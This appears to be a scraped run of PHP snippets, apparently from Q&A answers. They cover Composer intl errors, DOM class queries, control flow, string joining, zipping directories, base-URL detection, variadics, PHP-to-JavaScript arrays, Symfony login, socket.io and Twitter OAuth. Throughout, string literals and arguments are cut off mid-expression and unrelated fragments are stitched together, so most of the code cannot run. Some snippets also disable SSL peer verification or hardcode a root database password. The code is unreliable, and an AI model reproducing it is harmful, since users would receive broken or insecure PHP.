Your requirements could not be resolved to an installable set of packages. Problem 1 - symfony/icu v1.2.0-RC1 requires lib-icu >=4.4 -> the requested linked library icu has the wrong version installed or is missing from your system, make sure to have the extension providing it. - symfony/icu v1.1.0-RC1 requires lib-icu >=3.8 -> the requested linked library icu has the wrong version installed or is missing from your system, make sure to have the extension providing it. - symfony/symfony v2.3.0-RC1 requires symfony/icu >=1.0,<2.0 -> satisfiable by symfony/icu[v1.1.0-RC1, v1.2.0-RC1]. - Installation request for symfony/symfony 2.3.* -> satisfiable by symfony/symfony[v2.3.0-RC1].
extension=intl.so ; *nix extension=php_intl.dll ; windows [intl] intl.default_locale = en_utf8 intl.error_level = E_WARNING
composer create-project symfony/framework-standard-edition mynewerproject/ 2.3.*@dev
brew install icu4c sudo pecl install intl The path to the ICU libraries and headers is: /usr/local/opt/icu4c/ Edit /etc/php.ini and add extension=intl.so to the end.
[intl] intl.default_locale = en_utf8 intl.error_level = E_WARNING
$ brew tap josegonzalez/php $ brew tap homebrew/dupes $ brew install josegonzalez/php/php55-intl $ sudo apachectl restart
$dom = new DomDocument(); $dom->load($filePath); $finder = new DomXPath($dom); $classname="my-class"; $nodes = $finder->query("
$dom = new DomDocument(); $dom->load($filePath); $finder = new DomXPath($dom); $classname="my-class"; $nodes = $finder->query("
$finder = new Zend_Dom_Query($html); $classname = $nodes = $finder->query("*[class~=\"$classname\"]");
$dom = new DomDocument(); $dom->load($filePath); $classname = $finder = new DomXPath($dom); $nodes = $finder->query(" $tmp_dom = new DOMDocument(); foreach ($nodes as $node) { $tmp_dom->appendChild($tmp_dom->importNode($node,true)); } $innerHTML.=trim($tmp_dom->saveHTML()); echo $innerHTML;
function getElementByClass(&$parentNode, $tagName, $className, $offset = 0) { $response = false; $childNodeList = $parentNode->getElementsByTagName($tagName); $tagCount = 0; for ($i = 0; $i < $childNodeList->length; $i++) { $temp = $childNodeList->item($i); if (stripos($temp->getAttribute( if ($tagCount == $offset) { $response = $temp; break; } $tagCount++; } } return $response; }
include $doc = str_get_html($html); $href = $doc->find(
function getElementsByClass(&$parentNode, $tagName, $className) { $nodes=array(); $childNodeList = $parentNode->getElementsByTagName($tagName); for ($i = 0; $i < $childNodeList->length; $i++) { $temp = $childNodeList->item($i); if (stripos($temp->getAttribute( $nodes[]=$temp; } } return $nodes; }
<html> <body> <div id="content_node"> <p class="a">I am in the content node.</p> <p class="a">I am in the content node.</p> <p class="a">I am in the content node.</p> </div> <div id="footer_node"> <p class="a">I am in the footer node.</p> </div> </body> </html>
$dom = new DOMDocument( $dom->loadHTML($html); $content_node=$dom->getElementById("content_node"); $div_a_class_nodes=getElementsByClass($content_node,
$con = mysql_connect("localhost","root","password"); if (!$con) { die( }
if (!function_exists( throw new Exception( Recomplie PHP with curl }
if(!is_array($config) && isset($config)) { trigger_error( }
$db->query( try { while ($row = gather_data()) { $db->query( } $db->query( } catch(Exception $e) { $db->query( }
$arr=array( foreach($arr as $val) { break; echo "test"; } echo "finish";
$a="test"; if("test"==$a) { break; echo "yes"; } echo "finish";
if(process_x()) { if(process_y()) { if(process_z()) { } else { clean_all_processes(); } } else { clean_all_processes(); } } else { clean_all_processes(); }
do { if( !process_x() ) { clean_all_processes(); break; } if( !process_y() ) { clean_all_processes(); break; } if( !process_z() ) { clean_all_processes(); break; } } while (0);
try{ if( !process_x() ){ throw new Exception( } if( !process_y() ){ throw new Exception( } if( !process_z() ){ throw new Exception( } }catch(Exception $ex){ clean_all_processes(); }
try{ if( process_x() && process_y() && process_z() ) { } else { clean_all_processes(); } }catch(Exception ex){ clean_all_processes(); }
do { $subjectText = trim(filter_input(INPUT_POST, if(!$subjectText) { $smallInfo = break; } $messageText = trim(filter_input(INPUT_POST, if(!$messageText) { $smallInfo = break; } } while(false);
<?php do if ($foo) { if ($abort_if_block) break; } while (false); ?>
if(smth) { ..... ..... ..... ..... ..... goto Area1; ..... ..... } Area1: ....your code here....
$a=1; switch($a) { case "1": if ($coniditon1){ break; } if ($coniditon2){ break; } if ($coniditon3){ break; } }
$a="test"; if("test"==$a) { if ($someOtherCondition) { echo "yes"; } } echo "finish";
$arr=array( $a= foreach($arr as $val){ $output = if($val === $a) $output = ""; echo $output; } echo "finish";
function myfunction(){ if( !process_x() || !process_y() || !process_z()) { clean_all_processes(); return; } }
$a="test"; if("test"==$a) { if (1==0){ echo "yes"; } } echo "finish";
foreach($arr as $val) { exit(); echo "test"; } echo "finish";
for ($x = 2; $x < 12; $x++) { echo "Gru has $x minions <br>"; if($x == 4){ exit(); } }
Gru has 2 minions Gru has 3 minions Gru has 4 minions
<?php if (empty($_POST[ $action = } else { $action = $_POST[ } ?>
$a="test"; if("test"!=$a) { echo "yes"; } else { echo "finish"; }
$fields = array( "names" => array( "type" => "text", "class" => "name", "name" => "name", "text_before" => "name", "value" => "", "required" => true, ) )
function checkForm($fields){ foreach($fields as $field){ if($field[ $fields[$field][ } } return $fields; }
foreach ($fields as $key => $field) { if ($field[ $fields[$key][ } }
function checkForm(& $fields){ foreach($fields as $field){ if($field[ $fields[$field][ } } return $fields; }
function checkForm($fields){ foreach($fields as $field){ if($field[ $field[ } } return $field; }
$data1 = "the color is"; $data2 = "red"; $result = $data1 .
printf("%s %s", $data1, $data2); $result = sprintf("%s %s", $data1, $data2); echo $result;
$string = "the color is "; $string .= "red"; echo $string;
<?php $data1 = "the color is"; $data2 = "red"; $result = "{$data1} {$data2}";
$txt1 = "the color is"; $txt2 = " red!"; echo $txt1.$txt2;
$data1="The colour is "; $data2="red"; $result=$data1.$data2;
<?php $txt1 = "Sachin"; $txt2 = "Tendulkar"; $result = $txt1.$txt2 ; echo $result. "\n"; ?>
<?php $txt1 = "Sachin"; $txt2 = "Tendulkar"; $result = $txt1." ".$txt2; echo $result. "\n"; ?>
<?php $data1 = "Sachin"; $data2 = "Tendulkar"; printf("%s%s\n",$data1, $data2); printf("%s %s\n",$data1, $data2); ?>
$data1 = "the color is"; $data2 = "red"; $result = $data1 .
$translationText = "the color is %s"; $translationRed = "red"; $result = sprintf($translationText, $translationRed);
curl -v -H "Content-Type: application/json" -X POST -d http:
$ curl -H "Content-Type: application/json" \ -X POST \ -d http:
ob_start(); var_dump($someVar); $result = ob_get_clean();
$.post(URL_HERE ,{addedvar : ,function(d){ doAnyHere(d); } , );
; Always populate the $HTTP_RAW_POST_DATA variable. PHP ; to disable this feature and it will be removed in a future version. ; If post reading is disabled through enable_post_data_reading, ; $HTTP_RAW_POST_DATA is *NOT* populated. ; http: ; always_populate_raw_post_data = -1
var xhr = $.ajax({ url: url, type: "GET", dataType: "html", timeout: 500, });
var xhr = $.ajax({ url: url, type: "POST", data: {name: dataType: "html", timeout: 500, });
<IfModule mod_php5.c> php_value always_populate_raw_post_data -1 </IfModule>
benchmark( benchmark( benchmark( function benchmark($funcName) { $numCycles = 10000; $time_start = microtime(true); for ($i = 0; $i < $numCycles; $i++) { clearstatcache(); $funcName( } $time_end = microtime(true); $time = $time_end - $time_start; echo "$funcName x $numCycles $time seconds <br>\n"; }
ScriptAlias /php56 "C:/xampp/php56" Action application/x-httpd-php56-cgi /php56/php-cgi.exe <Directory "C:/xampp/php56"> AllowOverride None Options None Require all denied <Files "php-cgi.exe"> Require all granted </Files> </Directory>
<Directory "C:\xampp\htdocs\my_old_project1"> <FilesMatch "\.php$"> SetHandler application/x-httpd-php56-cgi </FilesMatch> </Directory> <Directory "C:\xampp\htdocs\my_old_project2"> <FilesMatch "\.php$"> SetHandler application/x-httpd-php56-cgi </FilesMatch> </Directory>
Listen 8056 <VirtualHost *:8056> <FilesMatch "\.php$"> SetHandler application/x-httpd-php56-cgi </FilesMatch> </VirtualHost>
<VirtualHost localhost56:80> DocumentRoot "C:\xampp\htdocs56" ServerName localhost56 <Directory "C:\xampp\htdocs56"> Require all granted </Directory> <FilesMatch "\.php$"> SetHandler application/x-httpd-php56-cgi </FilesMatch> </VirtualHost>
$renameCur = new PHPSwitch_Rename($currInst[ $renameNew = new PHPSwitch_Rename($newInst[ $apache_curent = $this->_cfg["phpInstallationsPath"]."apache/conf/extra/httpd-xampp.conf"; $apache_curent_rename = $this->_cfg["phpInstallationsPath"]."apache/conf/extra/httpd-xampp_".$currInst[ $apache_new = $this->_cfg["phpInstallationsPath"]."apache/conf/extra/httpd-xampp_".$newInst[ $apache_new_rename = $this->_cfg["phpInstallationsPath"]."apache/conf/extra/httpd-xampp.conf"; $renameCur_apache_conf = new PHPSwitch_Rename($apache_curent, $apache_curent_rename); $renameNew_apache_conf = new PHPSwitch_Rename($apache_new, $apache_new_rename); $transaction = new PHPSwitch_Rename_Transaction(); $transaction->add($renameCur); $transaction->add($renameNew); $transaction->add($renameCur_apache_conf); $transaction->add($renameNew_apache_conf);
LoadFile "C:/xampp/php/php7ts.dll" LoadFile "C:/xampp/php/libpq.dll" LoadModule php7_module "C:/xampp/php/php7apache2_4.dll"
LoadFile "C:/xampp/php5.6/php5ts.dll" LoadFile "C:/xampp/php5.6/libpq.dll" LoadModule php5_module "C:/xampp/php5.6/php5apache2_4.dll"
foreach(preg_split("/((\r?\n)|(\r\n?))/", $subject) as $line){ }
$separator = "\r\n"; $line = strtok($subject, $separator); while ($line !== false) { $line = strtok( $separator ); }
$fp = fopen("php: fputs($fp, $data); rewind($fp); while($line = fgets($fp)){ } fclose($fp);
foreach(preg_split( if(empty($line) or ctype_space($line)) continue; }
<?php function process($str) { $line = strtok($str, PHP_EOL); while ($line !== FALSE) { $line = strtok(PHP_EOL); } strtok( }
$lines = file( $some_file ); foreach ( $lines as $line ) { }
<?php if(condition){ ?> <!-- HTML here --> <?php } ?>
$variable = <<<XYZ <html> <body> </body> </html> XYZ; echo $variable;
<?php if ($something): ?> <some /> <tags /> <etc /> <?=$shortButControversialWayOfPrintingAVariable ?> <?php ?> <?php else: ?> <!-- else --> <?php endif; ?>
<?php ?> <html> <head> <title><?=$title?></title> </head> <body> <?php foreach ( $something as $item ) : ?> <p><?=$item?></p> <?php endforeach; ?> </body> </html>
<html> <head> <% if (X) { %> <title>Definitely X</title> <% } else { %> <title>Totally not X</title> <% } %> </head> </html>
$page = $content = file_get_contents( $pagecontent = str_replace( echo($pagecontent);
<?php ob_start(); echo( $php_output = ob_get_contents(); ob_end_clean(); ?> <h1> My Template page says </h1> <?php echo($php_output ); ?> <hr> template footer
<?php print(' <div class="wrap"> <span class="textClass">TESTING</span> </div> ?>
$rootPath = realpath( $zip = new ZipArchive(); $zip->open( /** @var SplFileInfo[] $files */ $files = new RecursiveIteratorIterator( new RecursiveDirectoryIterator($rootPath), RecursiveIteratorIterator::LEAVES_ONLY ); foreach ($files as $name => $file) { if (!$file->isDir()) { $filePath = $file->getRealPath(); $relativePath = substr($filePath, strlen($rootPath) + 1); $zip->addFile($filePath, $relativePath); } } $zip->close();
$rootPath = realpath( $zip = new ZipArchive(); $zip->open( $filesToDelete = array(); /** @var SplFileInfo[] $files */ $files = new RecursiveIteratorIterator( new RecursiveDirectoryIterator($rootPath), RecursiveIteratorIterator::LEAVES_ONLY ); foreach ($files as $name => $file) { if (!$file->isDir()) { $filePath = $file->getRealPath(); $relativePath = substr($filePath, strlen($rootPath) + 1); $zip->addFile($filePath, $relativePath); if ($file->getFilename() != { $filesToDelete[] = $filePath; } } } $zip->close(); foreach ($filesToDelete as $file) { unlink($file); }
$zipFile = "./testZip.zip"; $zipArchive = new ZipArchive(); if (!$zipArchive->open($zipFile, ZIPARCHIVE::OVERWRITE)) die("Failed to create archive\n"); $zipArchive->addGlob("./*.txt"); if (!$zipArchive->status == ZIPARCHIVE::ER_OK) echo "Failed to write files to zip\n"; $zipArchive->close();
$zip = new ZipArchive; $zip->open( foreach (glob("target_folder/*") as $file) { $zip->addFile($file); if ($file != } $zip->close();
<?php class FlxZipArchive extends ZipArchive { public function addDir($location, $name) { $this->addEmptyDir($name); $this->addDirDo($location, $name); } private function addDirDo($location, $name) { $name .= $location .= $dir = opendir ($location); while ($file = readdir($dir)) { if ($file == $do = (filetype( $location . $file) == $this->$do($location . $file, $name . $file); } } } ?> <?php $the_folder = $zip_file_name = $za = new FlxZipArchive; $res = $za->open($zip_file_name, ZipArchive::CREATE); if($res === TRUE) { $za->addDir($the_folder, basename($the_folder)); $za->close(); } else{ echo } ?>
function create_zip($files = array(), $dest = if (file_exists($dest) && !$overwrite) { return false; } if (($files)) { $zip = new ZipArchive(); if ($zip->open($dest, $overwrite ? ZIPARCHIVE::OVERWRITE : ZIPARCHIVE::CREATE) !== true) { return false; } foreach ($files as $file) { $zip->addFile($file, $file); } $zip->close(); return file_exists($dest); } else { return false; } } function addzip($source, $destination) { $files_to_zip = glob($source . create_zip($files_to_zip, $destination); echo "done"; }
$zip = new ZipArchive(); $zip_name = time().".zip"; $zip->open($zip_name, ZipArchive::CREATE); foreach ($files as $file) { echo $path = "uploadpdf/".$file; if(file_exists($path)){ $zip->addFromString(basename($path), file_get_contents($path));---This is main function } else{ echo"file does not exist"; } } $zip->close();
function zip($source, $destination) { if (!extension_loaded( return false; } $zip = new ZipArchive(); if (!$zip->open($destination, ZIPARCHIVE::CREATE)) { return false; } $source = str_replace( if (is_dir($source) === true) { $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST); foreach ($files as $file) { $file = str_replace( if (in_array(substr($file, strrpos($file, continue; } $file = realpath($file); if (is_dir($file) === true) { $zip->addEmptyDir(str_replace($source . } elseif (is_file($file) === true) { $zip->addFromString(str_replace($source . } } } elseif (is_file($source) === true) { $zip->addFromString(basename($source), file_get_contents($source)); } return $zip->close(); }
<?php $directory = "./"; $zip = new ZipArchive(); $zip_name = time().".zip"; $zip->open($zip_name, ZipArchive::CREATE); $files = new RecursiveIteratorIterator( new RecursiveDirectoryIterator($directory), RecursiveIteratorIterator::LEAVES_ONLY ); foreach ($files as $file) { $path = $file->getRealPath(); if(fileperms($path)!="16895"){ $zip->addFromString(basename($path), file_get_contents($path)) ; echo "<span style= } else{ echo"<span style= } } $zip->close(); ?>
$zip = new ZipArchive; $zip->open( foreach (glob(APPLICATION_PATH."pages/recruitment/uploads/test_pdf_folder/*") as $file) { $new_filename = end(explode("/",$file)); $zip->addFile($file,"emp/".$new_filename); } $zip->close();
<?php $pathBase = $zipPREFIX = "sitename_www"; $zipDATING = $zipPOSTFIX = "backup"; $zipEXTENSION = ".zip"; ini_set( ini_set( error_reporting(-1); $iBaseLen = strlen($pathBase); $iPreLen = strlen($zipPREFIX); $iPostLen = strlen($zipPOSTFIX); $sFileZip = $pathBase . $zipPREFIX . $zipDATING . $zipPOSTFIX . $zipEXTENSION; $oFiles = array(); $oFiles_Error = array(); $oFiles_Previous = array(); echo if (file_exists($sFileZip)) { echo "<h3 style= echo echo echo "</div>"; exit; } else { echo "<h3 style= echo echo echo "</div>"; $oZip = new ZipArchive; $oZip->open($sFileZip, ZipArchive::CREATE | ZipArchive::OVERWRITE); $oFilesWrk = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($pathBase),RecursiveIteratorIterator::LEAVES_ONLY); foreach ($oFilesWrk as $oKey => $eFileWrk) { $sFilePath = substr($eFileWrk->getPathname(),$iBaseLen, strlen($eFileWrk->getPathname())- $iBaseLen); $sFileReal = $eFileWrk->getRealPath(); $sFile = $eFileWrk->getBasename(); $sMyFP = str_replace( if (file_exists($sMyFP)) { if ($sFile!="." && $sFile!="..") { if (substr($sFile,0, $iPreLen)!=$zipPREFIX && substr($sFile,-1, $iPostLen + 4)!= $zipPOSTFIX.$zipEXTENSION) { $oFiles[] = $sMyFP; $oZip->addFile($sMyFP, $sFilePath); } else { $oFiles_Previous[] = $sMyFP; } } } else { $oFiles_Error[] = $sMyFP; } } $sZipStatus = $oZip->getStatusString(); $oZip->close(); echo "<h3 style= echo "<b>Zipper Status: </b>" . $sZipStatus . "<br />"; echo "<b>Finished Zip Script: </b>",$sFileZip,"<br />"; echo "<b>Zip Size: </b>",human_filesize($sFileZip),"<br />"; echo "</div>"; echo "<h3 style= foreach ($oFiles_Previous as $eFile) { echo basename($eFile) . ", Size: " . human_filesize($eFile) . "<br />"; } echo "</div>"; if (count($oFiles_Error)>0) { echo "<h3 style= foreach ($oFiles_Error as $eFile) { echo $eFile . "<br />"; } echo "</div>"; } echo "<h3 style= foreach ($oFiles as $eFile) { echo $eFile . "<br />"; } echo "</div>"; } function human_filesize($sFile, $decimals = 2) { $bytes = filesize($sFile); $sz = $factor = floor((strlen($bytes) - 1) / 3); return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . @$sz[$factor]; } ?>
$dir = $zip = new ZipArchive(); $res = $zip->open(trim($dir, "/") . if ($res === TRUE) { foreach (glob($dir . $zip->addFile($file, basename($file)); } $zip->close(); } else { echo }
echo dirname(__FILE__) or echo basename(__FILE__); etc.
function url(){ return sprintf( "%s: isset($_SERVER[ $_SERVER[ $_SERVER[ ); } echo url();
<VirtualHost *> ServerName example.com UseCanonicalName on </VirtualHost>
function url(){ if(isset($_SERVER[ $protocol = ($_SERVER[ } else{ $protocol = } return $protocol . ": }
if (!function_exists( function base_url($atRoot=FALSE, $atCore=FALSE, $parse=FALSE){ if (isset($_SERVER[ $http = isset($_SERVER[ $hostname = $_SERVER[ $dir = str_replace(basename($_SERVER[ $core = preg_split( $core = $core[0]; $tmplt = $atRoot ? ($atCore ? "%s: $end = $atRoot ? ($atCore ? $core : $hostname) : ($atCore ? $core : $dir); $base_url = sprintf( $tmplt, $http, $hostname, $end ); } else $base_url = if ($parse) { $base_url = parse_url($base_url); if (isset($base_url[ } return $base_url; } }
echo base_url(); echo base_url(TRUE); echo base_url(TRUE, TRUE); || echo base_url(NULL, TRUE); echo base_url(NULL, NULL, TRUE);
Array ( [scheme] => http [host] => aaa.bbb.com [path] => / )
<?php function home_base_url(){ $base_url = (isset($_SERVER[ $_SERVER[ $tmpURL = dirname(__FILE__); $tmpURL = str_replace(chr(92), $tmpURL = str_replace($_SERVER[ $tmpURL = ltrim($tmpURL, $tmpURL = rtrim($tmpURL, if (strpos($tmpURL, $tmpURL = explode( $tmpURL = $tmpURL[0]; } if ($tmpURL !== $_SERVER[ $base_url .= $_SERVER[ else $base_url .= $tmpURL. return $base_url; } ?> echo home_base_url();
<?php function curPageURL() { $pageURL = if ($_SERVER["HTTPS"] == "on") {$pageURL .= "s";} $pageURL .= ": if ($_SERVER["SERVER_PORT"] != "80") { $pageURL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"]; } else { $pageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"]; } return $pageURL; } ?>
<?php function curPageName() { return substr($_SERVER["SCRIPT_NAME"],strrpos($_SERVER["SCRIPT_NAME"],"/")+1); } echo "The current page name is ".curPageName(); ?>
trait URL { private $url = private $current_url = public $get = function __construct() { $this->url = $_SERVER[ $this->current_url = $_SERVER[ $clean_server = str_replace( $clean_server = explode( $this->get = array( } }
<?php /* Test file Tested for links: http: http: http: http: http: http: http: */ require_once class Home { use URL; } $h = new Home(); ?> <a href="<?=$h->get[
$host = $_SERVER[ $host_upper = strtoupper($host); $path = rtrim(dirname($_SERVER[ $baseurl = "http:
$http = isset($_SERVER[ $url = $http . $_SERVER["SERVER_NAME"] . $_SERVER[
function server_url(){ $server =""; if(isset($_SERVER[ $server = sprintf("%s: } else{ $server = sprintf("%s: } print $server; }
function disectURL() { $arr = array(); $a = explode( "%s: isset($_SERVER[ $_SERVER[ $_SERVER[ )); $arr[ $arr[ if(sizeof($a) == 2) { $b = explode( $qs = array(); foreach ($b as $c) { $d = explode( $qs[$d[0]] = $d[1]; } $arr[ } return $arr; }
/** * Get the base URL of the current page. For example, if the current page URL is * "https: * "https: * * @return string The base URL of the current page. */ function get_base_url() { $protocol = filter_input(INPUT_SERVER, if (empty($protocol)) { $protocol = "http"; } $host = filter_input(INPUT_SERVER, $request_uri_full = filter_input(INPUT_SERVER, $last_slash_pos = strrpos($request_uri_full, "/"); if ($last_slash_pos === FALSE) { $request_uri_sub = $request_uri_full; } else { $request_uri_sub = substr($request_uri_full, 0, $last_slash_pos + 1); } return $protocol . ": }
$currentPath = $_SERVER[ $pathInfo = pathinfo($currentPath); $hostName = $_SERVER[ $protocol = strtolower(substr($_SERVER["SERVER_PROTOCOL"],0,5))== echo $protocol.$hostName.$pathInfo[
function test() { var_dump(func_num_args()); var_dump(func_get_args()); }
function addDateIntervalsToDateTime( DateTime $dt, DateInterval ...$intervals ) { foreach ( $intervals as $interval ) { $dt->add( $interval ); } return $dt; } addDateIntervaslToDateTime( new DateTime, new DateInterval( new DateInterval(
function manyVars(...$params) { var_dump($params); }
function do_something($first, ...$all_the_others) { var_dump($first); var_dump($all_the_others); } do_something(
function do_something($first, ...$all_the_others) { do_something_else($first, ...$all_the_others); }
function do_something($first, int ...$all_the_others) { /**/ }
function test(){ print_r(func_get_args()); } test("blah"); test("blah","blah");
function add($arr){ extract($arr, EXTR_REFS); return $one+$two; } $one = 1; $two = 2; echo add(compact(
function myFunction($requiredArgument, $optionalArgument = "default"){ echo $requiredArgument . $optionalArgument; }
class Foo { public function __invoke($method=null, $args=[]){ if($method){ return call_user_func_array([$this, $method], $args); } return false; } public function methodName($arg1, $arg2, $arg3){ } }
if(strpos( $_SERVER[ echo "Yes this is indeed the banana.com domain"; }
<?php $wordToHighlight= "banana.com"; $serverVarHighlighted = str_replace( $wordToHighlight, echo "<pre>"; print_r( $serverVarHighlighted ); echo "</pre>"; exit(); ?>
$urlparts = parse_url(home_url()); $domain = $urlparts[
$.ajax("url" : "www.site.com/script.php", ... $.ajax("url" : "site.com/script.php", ...
function fixDomainName($url= { $strToLower = strtolower(trim($url)); $httpPregReplace = preg_replace( $httpsPregReplace = preg_replace( $wwwPregReplace = preg_replace( $explodeToArray = explode( $finalDomainName = trim($explodeToArray[0]); return $finalDomainName; }
<html> <head> <script type="text/javascript"> function drawChart(row,day,week,month,date) { } </script> </head> <body> <?php for($counter = 0; $counter<count($au); $counter++) { switch($au[$counter]->id) { case pageID. $day[] = $au[$counter]->value; break; case pageID. $week[] = $au[$counter]->value; break; case pageID. $month[] = $au[$counter]->value; break; } } ?> <script> drawChart(600/50, </script> </body> </html>
<script type="text/javascript"> var obj = <?php echo json_encode($php_variable); ?>; </script>
drawChart(600/50, <?php echo json_encode($day); ?>, ...)
<?php $phpArray = array( 0 => "Mon", 1 => "Tue", 2 => "Wed", 3 => "Thu", 4 => "Fri", 5 => "Sat", 6 => "Sun", ) ?> <script type="text/javascript"> var jArray = <?php echo json_encode($phpArray); ?>; for(var i=0; i<jArray.length; i++){ alert(jArray[i]); } </script>
$employee = array( "employee_id" => 10011, "Name" => "Nathan", "Skills" => array( "analyzing", "documentation" => array( "desktop", "mobile" ) ) );
{ "employee_id": 10011, "Name": "Nathan", "Skills": { "0": "analyzing", "documentation": [ "desktop", "mobile" ] } }
$.ajax({ type: headers: { "cache-control": "no-cache" }, url: "employee.php", async: false, cache: false, data: { employee_id: 10011 }, success: function (jsonString) { var employeeData = JSON.parse(jsonString); });
<script type="javascript"> day = new Array(<?php echo implode( week = new Array(<?php echo implode( month = new Array(<?php echo implode( <!-- Then pass it to the JavaScript function: --> drawChart(<?php echo count($day); ?>, day, week, month); </script>
use Symfony\Component\Security\Core\Authentication\Token\UsernamePasswordToken; use Symfony\Bundle\FrameworkBundle\Controller\AbstractController; use YourNameSpace\UserBundle\Entity\User; class LoginController extends AbstractController{ public function registerAction() { $user = $token = new UsernamePasswordToken($user, null, $this->container->get( $this->container->get( } }
use Symfony\Component\Security\Core\Authentication\Token\UsernamePasswordToken; use Symfony\Bundle\FrameworkBundle\Controller\Controller; use YourNameSpace\UserBundle\Entity\User; class LoginController extends Controller{ public function registerAction() { $user = $token = new UsernamePasswordToken($user, null, $this->get( $this->get( } }
use Symfony\Component\Security\Core\Authentication\Token\UsernamePasswordToken; use Symfony\Bundle\FrameworkBundle\Controller\Controller; use YourNameSpace\UserBundle\Entity\User; class LoginController extends Controller{ public function registerAction() { $user = $token = new UsernamePasswordToken($user, null, $this->get( $this->get( } }
$token = new UsernamePasswordToken($userEntity, null, $this->get(
public function logUser(UserInterface $user) { $token = new UsernamePasswordToken($user, null, $this->container->get( }
use Symfony\Component\Security\Core\Authentication\Token\UsernamePasswordToken; use Symfony\Component\Security\Core\AuthenticationEvents; use Symfony\Component\Security\Core\Event\AuthenticationEvent; $user = $token = new UsernamePasswordToken( $user, null, $this->get( $this->get( AuthenticationEvents::AUTHENTICATION_SUCCESS, new AuthenticationEvent( $token ) );
$subRequest = Request::create($app[ $response = $app->handle($subRequest, HttpKernelInterface::MASTER_REQUEST, false); return $app->redirect($app[
try { $this->container->get( $this->container->getParameter( } catch (AccountStatusException $ex) { }
function sessionKill(){ session_destroy(); session_start(); }
<!DOCTYPE html> <html> <script type="text/javascript"> <!-- window.location = "admin_index.php"; </script> </html>
if($stmt->num_rows>0) { $_SESSION[ echo error_reporting(E_ALL);
<?php require( $_SESSION[ if ($_SESSION[ echo exit(); } else { echo } ?>
RewriteEngine on RewriteCond %{HTTP_HOST} ^yoursitename.com$ RewriteRule ^.*$ "http\:\/\/www\.yoursitename\.com" [R=301,L]
function register_my_session() { if (!session_id()) { session_start(); } } add_action(
session_start(); [...] session_write_close(); [...] $_SESSION[
session_start(); session_unset(); session_destroy(); session_start(); $_SESSION[
session_start(); error_reporting(E_ALL ^ (E_NOTICE | E_WARNING)); if(!isset($_SESSION[ unset($_SESSION[ session_destroy(); } if(isset($_SESSION[ $username = $_SESSION[ }
use ElephantIO\Client as Elephant; $elephant = new Elephant( $elephant->init(); $elephant->send( ElephantIOClient::TYPE_EVENT, null, null, json_encode(array( ); $elephant->close(); echo
var io = require( io.sockets.on( console.log( socket.on( console.log( }); });
use PHPSocketIO\SocketIO; $io = new SocketIO(2021); $io->on( $socket->on( $io->emit( }); });
var http = require( host = WWW_HOST, clen = site = http.createClient(80, host), request = site.request("POST", "/modules/nodeim/includes/signonuser.inc.php", { request.write( request.end();
<?php require __DIR__ . use Workerman\Worker; use PHPSocketIO\SocketIO; $io = new SocketIO(2021); $io->on( $socket->on( $io->emit( }); }); Worker::runAll();
<!DOCTYPE html> <html> <head> <title>Chat</title> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> </head> <body> <div id="chat-messages" style="overflow-y: scroll; height: 100px; "></div> <input type="text" class="message"> </body> <script src="https: <script src="socket.io-client/socket.io.js"></script> <script> var socket = io.connect("ws: $( socket.emit( $(this).val( }); socket.on( $( }); </script> </html>
var app = express(); var server = http.createServer(app); var io = require( server.on("connection", function(s) { if(s.remoteAddress == "::ffff:127.0.0.1") { s.on( var js = JSON.parse(buf); io.emit(js.msg,js.data); }); } });
function sio_message($message, $data) { $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP); $result = socket_connect($socket, if(!$result) { die( } $bytes = socket_write($socket, json_encode(Array("msg" => $message, "data" => $data))); socket_close($socket); }
{ code = 215; message = "Bad Authentication data"; }
<?php $token = $token_secret = $consumer_key = $consumer_secret = $host = $method = $path = $query = array( ); $oauth = array( ); $oauth = array_map("rawurlencode", $oauth); $query = array_map("rawurlencode", $query); $arr = array_merge($oauth, $query); asort($arr); ksort($arr); $querystring = urldecode(http_build_query($arr, $url = "https: $base_string = $method."&".rawurlencode($url)."&".rawurlencode($querystring); $key = rawurlencode($consumer_secret)."&".rawurlencode($token_secret); $signature = rawurlencode(base64_encode(hash_hmac( $url .= "?".http_build_query($query); $url=str_replace("&amp;","&",$url); $oauth[ ksort($oauth); function add_quotes($str) { return $oauth = array_map("add_quotes", $oauth); $auth = "OAuth " . urldecode(http_build_query($oauth, $options = array( CURLOPT_HTTPHEADER => array("Authorization: $auth"), CURLOPT_HEADER => false, CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true, CURLOPT_SSL_VERIFYPEER => false); $feed = curl_init(); curl_setopt_array($feed, $options); $json = curl_exec($feed); curl_close($feed); $twitter_data = json_decode($json); foreach ($twitter_data as &$value) { $tweetout .= preg_replace("/(http:\/\/|(www\.))(([^\s<]{4,68})[^\s<]*)/", $tweetout = preg_replace("/@(\w+)/", "<a href=\"http: $tweetout = preg_replace("/ } echo $tweetout; ?>
$connection = new TwitterOAuth(TWITTER_CONSUMER_KEY, TWITTER_CONSUMER_SECRET, $tokens[ $connection->host = $friendsJson = $connection->get(
$connection->host = "https: $connection->ssl_verifypeer = TRUE; $connection->content_type =
session_start(); require ( require ( $consumer_key = $consumer_secret = $to = new TwitterOAuth($consumer_key, $consumer_secret); $tok = $to->getRequestToken( $token = $tok[ $secret = $tok[ $_SESSION[ $_SESSION[ $request_link = $to->getAuthorizeURL($token,TRUE); header(
if($_REQUEST[ require ( require_once( $consumer_key = $consumer_secret = $oauth_token = $_GET[ $ttok = $_SESSION[ $tsec = $_SESSION[ $to = new TwitterOAuth($consumer_key, $consumer_secret, $ttok, $tsec); $tok = $to->getAccessToken(); $btok = $tok[ $bsec = $tok[ $twit_u_id = $tok[ $twit_screen_name = $tok[ $twit_screen_name=urlencode($twit_screen_name); $connection = new TwitterOAuth($consumer_key, $consumer_secret, $btok, $bsec); $connection->host = "https: $connection->ssl_verifypeer = TRUE; $connection->content_type = $ucontent = $connection->get( $t_user_name = $ucontent->name; $t_user_icon = $ucontent->profile_image_url; }
$connection = new TwitterOAuth( CONSUMER_KEY, CONSUMER_SECRET, OAUTH_TOKEN, OAUTH_TOKEN_SECRET ); $connection->host = "https: $connection->ssl_verifypeer = TRUE; $connection->content_type = $tweets = $connection->get(
$accessToken = new Zend_Oauth_Token_Access(); $accessToken->setToken( $accessToken->setTokenSecret( $client = $accessToken->getHttpClient(array( ));
